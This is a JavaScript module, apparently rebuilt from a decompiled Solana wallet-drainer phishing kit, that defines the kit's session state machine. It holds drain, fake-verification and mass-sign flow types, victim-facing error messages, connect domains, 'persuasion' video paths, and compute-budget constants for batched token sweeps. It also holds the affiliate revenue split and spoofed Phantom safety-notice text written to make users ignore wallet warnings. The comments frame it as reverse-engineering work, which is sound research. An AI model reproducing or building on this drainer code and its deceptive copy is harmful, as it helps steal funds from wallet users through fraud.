/**
 * rebuilt/core/state.js
 *
 * Central state machine for one drain session.
 *
 * Sources:
 *   - decompiled/kit/page/flow_state.js
 *   - bundle.deobfuscated.js lines 33542–33570 (歅 class, the runtime shell)
 *   - decompiled/live/RUNTIME_MAP.md (observed localStorage keys)
 *   - decompiled/live/dynamic/handler_events_parsed_2026-11-13.json
 */

'use strict';

// ── Flow type bytes (state.he.be) ───────────────────────────────────────
const FLOW = {
  DRAIN:  0,  // main drain: token sweep + SOL via operator program
  SIWS:   1,  // Sign-In-With-Solana "verify ownership" step
  SPAM:   2,  // 200-tx mass-sign prompt (flow type 2 / "200tx" video)
};

// ── Error messages (string table indices in original bundle) ────────────
const ERR = {
  TOPUP_PREFIX:   'Top-up your balance by at least ',    // [1033]
  NOT_OWNER:      "You can't perform any actions from this account because you're not it's owner", // [1034]
  CONNECT_OTHER:  'Connect another account',             // [1035]
  REVERTED:       'Transaction was reverted, funds will be refunded soon. Please try again.', // [1036]
  GENERIC_HDR:    'Something went wrong',                // [1037]
  NETWORK:        'Something went wrong. Please check your internet connection or try later.', // [1038]
  CRITICAL:       'Critical error occurred',             // [1039]
  TARGET_ACCT:    'This account is used as target account. Please connect another', // [1040]
  EXPIRED:        'The transaction has expired',         // [1041]
  RESIGN:         'Please sign it one more time to continue', // [1042]
  VERIFY_AGAIN:   'Please allow one more verification step', // [1043]
  WATCH_ADDR:     'This account is not a plain wallet. Please do not connect "Watch Addresses".', // [1051]
  INSUFFICIENT:   'You have an insufficient balance',   // [351]
};

// ── Persuasion video paths (served from connect domain) ─────────────────
// Connect domain: petramon.xyz → easyinvest7.biz → whatever the config sibling field says.
// Videos at /_nuxt/media/ on the connect domain.
const MEDIA_BASE = '/_nuxt/media/';
const VIDEO = {
  MALICIOUS: MEDIA_BASE + 'malicious.webm', // 10.8s — shown before first sign request
  SPAM_200:  MEDIA_BASE + '200tx.webm',     // 11.0s — shown during 200-tx flow
  REFUND:    MEDIA_BASE + 'refund.webm',    // 8.0s  — shown after reverted tx
};

// ── Fake Phantom-spoof modal copy ────────────────────────────────────────
// Injected into the kit's own UI to look like Phantom safety notices.
const PHANTOM_SPOOF = {
  // Turns Phantom's "unreviewed app" warning into a positive endorsement:
  UNREVIEWED:
    "This application hasn't been reviewed by Phantom yet, but it is listed " +
    "in trusted community-maintained safety databases. You can proceed with " +
    "confidence — this app is recognized as safe.",

  // Covers for the wallet preview not matching the stated intent:
  DELIVERY:
    "This dApp uses a new, optimized transaction delivery method that is not " +
    "yet displayed correctly in Phantom. You can proceed with confidence — " +
    "this app is recognized as safe.",

  // Frames the SIWS verify step as a security feature:
  ABUSE:
    "This dApp uses Abuse Protection to prevent misuse of platform. " +
    "You'll need to complete a quick verification of your transaction history. " +
    "It's completely safe and only takes a few seconds.",
};

// ── Compute budget constants (from constants array) ─────────────────────
const COMPUTE = {
  CAP:               8_000_000, // absolute max per tx (柳)
  PER_ACCOUNT_SOFT:  1_400_000, // per-account soft limit (綾)
  MAX_ACCOUNTS:      100,       // maximum accounts per drain batch (惛)
  BLOCKHASH_WINDOW:  432_000,   // slots until blockhash expires (鐘)
  PER_TOKEN:         5_000,     // base per token account
  TOKEN2022:         10_000,    // id 8: standard Token-2022 extra
  ATA_CREATE:        615_000,   // id 3: ATA init extra
  TOKEN2022_FEE:     20_300,    // id 9: Token-2022 with TransferFee
  WITH_FEE_A:        15_000,    // id 17 extra
  WITH_FEE_B:        100_000,   // id 19 extra
  OPTIMIZATION:     -1_488_440, // id 15: subtract (negative)
};

// ── Misc sizing constants ────────────────────────────────────────────────
const FEE_FACTOR_HIGH = 0.5;    // 脵 — multiply estimated fee by this for auto-price
const FEE_FACTOR_LOW  = 0.2;    // 鲽 — lower multiplier for small wallets
const SOL_AMOUNT_MIN  = 0.001;  // setSolAmount() hard floor
const SOL_AMOUNT_MAX  = 1_000_000; // setSolAmount() hard ceiling
const PROCESS_HEADER  = 52;     // 緢 — /process payload header byte count (confirmed deob line 20618)
const CONNECT_HEADER  = 59;     // 绾 — /c/i plaintext base size before account list

// ── State object factory ─────────────────────────────────────────────────
/**
 * createSession(apiHost):
 *   Returns the initial session state object (original: 信()/屭).
 *
 *   state.b          connected wallet object (from AppKit / WalletConnect)
 *   state.b.e        victim wallet pubkey (string, base58)
 *   state.b.name     wallet name (e.g. "Phantom")
 *   state.b.Ge       wallet connection type byte
 *   state.c          operator config object
 *   state.c.Se       apiHost (operator backend hostname)
 *   state.c.Ne       mutable config overrides (dt = drift flag)
 *   state.K          configured SOL amount in lamports
 *   state.he         per-attempt flow entry (null until drain starts)
 *   state.he.be      flow type byte (FLOW.DRAIN | FLOW.SIWS | FLOW.SPAM)
 *   state.he.ie      flag: skip self-broadcast (operator handles RPC submit)
 *   state.he.lr      account list for /c/i (encodeAccounts input)
 *   state.he.Fe      account list for /process payload
 *   state.ne         attempt counter (global retry count, incremented per /process call)
 */
function createSession(apiHost) {
  return {
    b:  null,       // connected wallet — set on wallet connect
    c:  {
      Se: apiHost,  // operator host
      Ne: {},       // mutable config overrides
    },
    K:  0,          // SOL amount in lamports (set by setSolAmount after /api/config loaded)
    he: null,       // flow entry — set at drain start
    ne: 0,          // global attempt counter
  };
}

// ── localStorage keys ────────────────────────────────────────────────────
// Confirmed from dynamic analysis (RUNTIME_MAP.md, handler_events_parsed).
const LS_KEYS = {
  VISIT_TIMESTAMP: '_0x5',    // unix seconds of last /api/visit with 'ok' response
  CONFIG_CACHE:    '_0x12',   // raw AES-GCM ciphertext of last /api/config response (base64)
  CAMPAIGN_SOURCE: '_0x6',    // campaign source tag (utm_source / referrer host)
  TG_USER:         '_0x3',    // cached Telegram user object (JSON)
};

// ── Affiliate revenue split ──────────────────────────────────────────────
// The main drain instruction (operator program disc 0x15) encodes the split:
//   args: [0x15, 0x02, <pct_byte>]
//   pct_byte 0x50 = 80% to per-campaign receiver, 20% to collector
//   pct_byte 0x4B = 75% to per-campaign receiver, 25% to collector
// Observed in real mainnet txs (decompiled/live/dynamic/real_drain_txs_2026-11-12.json).
const SPLIT = {
  PCT_80: 0x50,  // 80% affiliate / 20% vendor
  PCT_75: 0x4B,  // 75% affiliate / 25% vendor
};

module.exports = {
  FLOW, ERR, VIDEO, MEDIA_BASE, PHANTOM_SPOOF,
  COMPUTE, FEE_FACTOR_HIGH, FEE_FACTOR_LOW,
  SOL_AMOUNT_MIN, SOL_AMOUNT_MAX,
  PROCESS_HEADER, CONNECT_HEADER,
  createSession, LS_KEYS, SPLIT,
};
